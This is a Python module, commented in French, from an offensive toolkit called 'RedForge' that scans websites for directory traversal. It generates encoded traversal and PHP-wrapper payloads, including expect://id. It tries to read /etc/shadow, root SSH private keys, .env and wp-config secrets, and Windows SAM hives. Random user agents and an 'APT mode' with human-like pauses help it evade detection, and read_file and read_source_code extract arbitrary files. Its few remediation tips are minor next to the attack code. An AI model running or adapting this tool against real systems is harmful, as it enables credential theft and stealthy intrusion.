#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de directory traversal pour RedForge
Détection des vulnérabilités de traversal de répertoires
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class DirectoryTraversalConfig:
    """Configuration avancée pour la détection de directory traversal"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_params: Tuple[float, float] = (1, 3)
    delay_between_payloads: Tuple[float, float] = (0.3, 0.8)
    
    # Comportement
    max_depth: int = 10
    test_all_params: bool = True
    test_encoded_payloads: bool = True
    test_absolute_paths: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_error_based: bool = True
    detect_boolean_based: bool = True
    detect_time_based: bool = False
    test_wrappers: bool = True
    max_file_size: int = 10000  # Taille max à lire


class DirectoryTraversal:
    """Détection avancée des vulnérabilités de directory traversal"""
    
    def __init__(self, config: Optional[DirectoryTraversalConfig] = None):
        """
        Initialise le détecteur de directory traversal
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or DirectoryTraversalConfig()
        
        # Payloads de traversal
        self.traversal_payloads = self._generate_payloads()
        
        # Fichiers sensibles à tester
        self.sensitive_files = [
            # Linux/Unix
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/group",
            "/etc/hostname",
            "/etc/issue",
            "/etc/os-release",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cpuinfo",
            "/proc/meminfo",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/home/user/.bash_history",
            "/root/.bash_history",
            "/root/.ssh/id_rsa",
            "/root/.ssh/id_rsa.pub",
            "/var/www/html/config.php",
            "/var/www/html/.env",
            "/var/www/html/wp-config.php",
            "/usr/local/etc/php.ini",
            "/etc/nginx/nginx.conf",
            "/etc/apache2/apache2.conf",
            # Windows
            "C:\\windows\\win.ini",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\xampp\\htdocs\\config.php",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\windows\\System32\\config\\SAM",
            "C:\\windows\\System32\\config\\SYSTEM"
        ]
        
        # Signatures de succès
        self.success_signatures = {
            "passwd": [r'root:.*:0:0:', r'daemon:.*:1:1:', r'bin:.*:2:2:'],
            "shadow": [r'root:\$.*:\d+:\d+:::'],
            "win_ini": [r'\[fonts\]', r'\[extensions\]', r'\[mci extensions\]'],
            "env": [r'PATH=', r'HOME=', r'USER=', r'PWD='],
            "ssh_key": [r'BEGIN RSA PRIVATE KEY', r'BEGIN OPENSSH PRIVATE KEY', r'BEGIN DSA PRIVATE KEY'],
            "hosts": [r'127\.0\.0\.1\s+localhost', r'::1\s+localhost'],
            "wp_config": [r'DB_NAME', r'DB_USER', r'DB_PASSWORD', r'AUTH_KEY'],
            "env_file": [r'APP_ENV', r'DATABASE_URL', r'API_KEY'],
            "bash_history": [r'cd ', r'ls ', r'cat ', r'ssh ']
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_payloads(self) -> List[str]:
        """Génère une liste complète de payloads de traversal"""
        payloads = []
        
        # Basic traversal
        for i in range(1, self.config.max_depth + 1):
            payloads.append("../" * i + "etc/passwd")
            payloads.append("../" * i + "etc/shadow")
            payloads.append("..\\" * i + "windows\\win.ini")
        
        # Encoded payloads
        if self.config.test_encoded_payloads:
            encodings = [
                ("%2e%2e%2f", "../"),
                ("%252e%252e%252f", "../../"),
                ("%c0%ae%c0%ae%c0%af", "../"),
                ("%2e%2e\\", "..\\"),
                ("..%252f", "../"),
                ("..%c0%af", "../"),
                ("%2e%2e/%2e%2e/%2e%2e/", "../../../")
            ]
            
            for encoded, decoded in encodings:
                for depth in range(1, 5):
                    payloads.append((encoded * depth) + "etc/passwd")
        
        # Absolute paths
        if self.config.test_absolute_paths:
            payloads.extend([
                "/etc/passwd",
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "C:\\windows\\win.ini",
                "/var/www/html/index.php"
            ])
        
        # Null byte (anciennes versions)
        for payload in payloads[:10]:  # Limiter pour éviter trop de payloads
            payloads.append(payload + "%00")
            payloads.append(payload + "\0")
        
        # Double traversal
        payloads.extend([
            "....//....//....//etc/passwd",
            "....\\....\\....\\windows\\win.ini",
            "..;/..;/..;/etc/passwd",
            "..././..././..././etc/passwd"
        ])
        
        return list(dict.fromkeys(payloads))  # Dédupliquer
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités de directory traversal
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - depth: Profondeur de traversal
                - files: Fichiers spécifiques à tester
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test de directory traversal sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Scan discret")
        
        vulnerabilities = []
        tested_params = set()
        
        # Extraire les paramètres
        params_to_test = self._get_params_to_test(target, kwargs)
        
        # Limiter les fichiers à tester en mode APT
        files_to_test = kwargs.get('files', self.sensitive_files)
        if self.config.apt_mode:
            files_to_test = files_to_test[:5]  # Moins de fichiers en mode APT
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT entre les paramètres
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_params))
            
            print(f"    → Test paramètre: {param}")
            
            for file_path in files_to_test:
                # Tester différentes profondeurs
                for depth in range(1, min(self.config.max_depth + 1, 6)):
                    if self.config.apt_mode and depth > 3:
                        continue  # Moins de profondeur en mode APT
                    
                    traversal = "../" * depth + file_path.lstrip('/')
                    
                    # Pause entre payloads
                    if self.config.random_delays:
                        time.sleep(random.uniform(*self.config.delay_between_payloads))
                    
                    result = self._test_traversal(target, param, traversal)
                    self.payloads_tested += 1
                    
                    if result['vulnerable']:
                        self.vulnerabilities_found += 1
                        vulnerabilities.append({
                            "parameter": param,
                            "file": file_path,
                            "payload": traversal,
                            "severity": "HIGH",
                            "evidence": result['evidence'],
                            "content": result.get('content', '')[:500] if result.get('content') else None,
                            "content_preview": self._get_content_preview(result.get('content', '')),
                            "risk_score": 85
                        })
                        print(f"      ✓ Directory traversal: {param} -> {file_path}")
                        break
                
                # Sortir si trouvé pour ce paramètre
                if any(v['parameter'] == param for v in vulnerabilities):
                    break
        
        # Tester les wrappers PHP
        if self.config.test_wrappers:
            wrapper_vulns = self._test_wrappers(target, params_to_test)
            vulnerabilities.extend(wrapper_vulns)
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'depth' in kwargs:
            self.config.max_depth = min(kwargs['depth'], 10)
        if 'test_all_params' in kwargs:
            self.config.test_all_params = kwargs['test_all_params']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_depth = min(self.config.max_depth, 5)
            self.config.delay_between_params = (5, 15)
            self.config.delay_between_payloads = (2, 5)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params and self.config.test_all_params:
            params = self._extract_params(target)
        
        if not params:
            params = ['file', 'page', 'view', 'load', 'include', 'path', 'doc', 
                     'document', 'folder', 'dir', 'directory', 'filename', 
                     'template', 'theme', 'lang', 'language']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_traversal(self, target: str, param: str, payload: str) -> Dict[str, Any]:
        """
        Teste un payload de directory traversal
        
        Args:
            target: URL cible
            param: Paramètre à tester
            payload: Payload à injecter
        """
        result = {
            'vulnerable': False,
            'evidence': '',
            'content': None
        }
        
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Vérifier les signatures de succès
            for sig_type, patterns in self.success_signatures.items():
                for pattern in patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        result['vulnerable'] = True
                        result['evidence'] = sig_type
                        result['content'] = response.text[:self.config.max_file_size]
                        return result
            
            # Détection basée sur les erreurs
            if self.config.detect_error_based:
                error_indicators = [
                    'failed to open stream',
                    'file_get_contents',
                    'No such file',
                    'cannot find',
                    'Unable to open',
                    'No entry',
                    'failed to open dir'
                ]
                
                for indicator in error_indicators:
                    if indicator in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = 'error_based'
                        return result
            
            # Détection de contenu binaire
            if response.content and len(response.content) > 100:
                # Vérifier si le contenu ressemble à un fichier binaire
                if b'\x00' in response.content or b'ELF' in response.content:
                    result['vulnerable'] = True
                    result['evidence'] = 'binary_content'
                    result['content'] = response.text[:self.config.max_file_size]
                    return result
                    
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass
        
        return result
    
    def _test_wrappers(self, target: str, params: List[str]) -> List[Dict[str, Any]]:
        """
        Teste les wrappers PHP pour lire le code source
        
        Args:
            target: URL cible
            params: Liste des paramètres à tester
        """
        vulnerabilities = []
        
        wrappers = [
            "php://filter/convert.base64-encode/resource=",
            "php://filter/read=convert.base64-encode/resource=",
            "php://filter/convert.base64-decode/resource=",
            "php://filter/zlib.deflate/resource=",
            "expect://id"
        ]
        
        for param in params:
            for wrapper in wrappers:
                # Tenter de lire un fichier commun
                test_files = ["index.php", "config.php", "wp-config.php"]
                
                for test_file in test_files:
                    payload = wrapper + test_file
                    result = self._test_traversal(target, param, payload)
                    
                    if result['vulnerable'] and result.get('content'):
                        # Décoder le base64 si nécessaire
                        content = result['content']
                        if 'base64' in wrapper:
                            try:
                                decoded = base64.b64decode(content).decode('utf-8', errors='ignore')
                                if len(decoded) > 100:  # Contenu valide
                                    vulnerabilities.append({
                                        "parameter": param,
                                        "file": test_file,
                                        "payload": payload,
                                        "severity": "CRITICAL",
                                        "evidence": "source_code_disclosure",
                                        "content_preview": decoded[:500],
                                        "risk_score": 95
                                    })
                                    print(f"      ✓ Code source exposé: {param} -> {test_file}")
                                    break
                            except:
                                pass
                
                if vulnerabilities and any(v['parameter'] == param for v in vulnerabilities):
                    break
        
        return vulnerabilities
    
    def _get_content_preview(self, content: str) -> str:
        """Génère un aperçu du contenu pour le rapport"""
        if not content:
            return None
        
        lines = content.split('\n')
        preview_lines = []
        
        for line in lines[:10]:
            if len(line) > 80:
                preview_lines.append(line[:77] + "...")
            else:
                preview_lines.append(line)
        
        return '\n'.join(preview_lines)
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "max_depth": self.config.max_depth,
                "test_wrappers": self.config.test_wrappers
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucun directory traversal détecté"}
        
        files_accessed = {}
        for v in vulnerabilities:
            file_name = v['file'].split('/')[-1]
            files_accessed[file_name] = files_accessed.get(file_name, 0) + 1
        
        return {
            "total": len(vulnerabilities),
            "files_accessed": list(files_accessed.keys()),
            "source_code_exposed": any(v.get('evidence') == 'source_code_disclosure' for v in vulnerabilities),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Ne jamais faire confiance aux entrées utilisateur pour les chemins de fichiers")
            recommendations.add("Utiliser une liste blanche de fichiers autorisés")
            recommendations.add("Implémenter un mapping entre identifiants sécurisés et chemins réels")
        
        if any(v.get('evidence') == 'source_code_disclosure' for v in vulnerabilities):
            recommendations.add("Désactiver les wrappers PHP (allow_url_fopen, allow_url_include)")
            recommendations.add("Configurer open_basedir pour restreindre l'accès aux fichiers")
        
        if any('.env' in v['file'] for v in vulnerabilities):
            recommendations.add("Placer les fichiers .env en dehors du répertoire web")
            recommendations.add("Configurer le serveur pour refuser l'accès aux fichiers .env")
        
        recommendations.add("Utiliser des fonctions de validation de chemin comme realpath()")
        recommendations.add("Normaliser les chemins avant utilisation")
        
        return list(recommendations)
    
    def read_file(self, target: str, param: str, file_path: str, 
                  depth: int = None) -> Optional[str]:
        """
        Tente de lire un fichier via directory traversal
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            file_path: Chemin du fichier à lire
            depth: Profondeur de traversal (auto-détection si None)
        """
        if depth is None:
            # Auto-détection de la profondeur
            for test_depth in range(1, 11):
                traversal = "../" * test_depth + file_path.lstrip('/')
                result = self._test_traversal(target, param, traversal)
                if result['vulnerable']:
                    return result.get('content')
        else:
            traversal = "../" * depth + file_path.lstrip('/')
            result = self._test_traversal(target, param, traversal)
            if result['vulnerable']:
                return result.get('content')
        
        return None
    
    def read_source_code(self, target: str, param: str, script_path: str) -> Optional[str]:
        """
        Tente de lire le code source via des wrappers PHP
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            script_path: Chemin du script
        """
        wrappers = [
            f"php://filter/convert.base64-encode/resource={script_path}",
            f"php://filter/read=convert.base64-encode/resource={script_path}",
            f"php://filter/convert.base64-decode/resource={script_path}",
            f"php://filter/zlib.deflate/resource={script_path}"
        ]
        
        for wrapper in wrappers:
            result = self._test_traversal(target, param, wrapper)
            
            if result['vulnerable'] and result.get('content'):
                # Décoder le base64
                content = result['content']
                if 'base64' in wrapper:
                    try:
                        decoded = base64.b64decode(content).decode('utf-8', errors='ignore')
                        if len(decoded) > 50:  # Contenu valide
                            return decoded
                    except:
                        pass
                
                return content
        
        return None
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    dt = DirectoryTraversal()
    results = dt.scan("https://example.com/page?file=index")
    print(f"Directory traversal trouvé: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = DirectoryTraversalConfig(apt_mode=True, max_depth=5)
    dt_apt = DirectoryTraversal(config=apt_config)
    results_apt = dt_apt.scan("https://example.com/page?file=index", apt_mode=True)
    print(f"Directory traversal (APT): {results_apt['count']}")
    
    # Lire un fichier si vulnérable
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        content = dt_apt.read_file(
            "https://example.com/page",
            vuln['parameter'],
            "/etc/passwd",
            depth=3
        )
        if content:
            print(f"\nContenu du fichier: {content[:200]}...")